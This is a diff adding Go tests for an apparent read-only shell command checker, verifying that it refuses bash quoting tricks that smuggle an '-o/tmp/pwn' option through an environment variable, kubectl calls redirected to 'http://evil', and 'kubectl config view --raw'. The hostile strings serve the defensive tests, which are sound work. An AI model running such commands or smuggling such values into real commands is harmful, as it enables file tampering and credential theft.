@@ -340,3 +340,24 @@ func TestReadOnlySQLClientsRefused(t *testing.T) {
 	refusedReadOnly(t, `psql -c 'select 1'`, `psql app`, `sudo -u postgres psql -c 'select f()'`,
 		`mysql -e 'select 1'`, `mariadb app`, `psql -c '\echo `+"`id`"+`'`)
 }
+
+// Review round 4 (2026-11-17): bash's own quoting ($'..', comments,
+// here-documents) can hide where a double quote starts, so an -e name in
+// a command with any double quote is refused.
+func TestReadOnlyEnvQuotingTricks(t *testing.T) {
+	for _, cmd := range []string{
+		`echo $'\'' "$x"; sort "$x" f`,
+		": # '\nsort \"$x\" f",
+		"cat <<'E'\n'\nE\nsort \"$x\" f",
+		`echo "hi"; sort ${x} f`,
+	} {
+		if !readOnlyMutates(cmd, []string{`x=-o/tmp/pwn`}) {
+			t.Errorf("%q with -e x=-o/tmp/pwn passed", cmd)
+		}
+	}
+	if readOnlyMutates(`echo "hi"; du -sh $xy`, []string{`x=/var`}) {
+		t.Error("an -e name that only starts another word refused")
+	}
+	refusedReadOnly(t, `kubectl get pods -shttp://evil`, `kubectl -n x get pods -s=http://evil`, `kubectl config view --raw`)
+	allowedReadOnly(t, `kubectl config view`, `kubectl get svc -o wide`)
+}
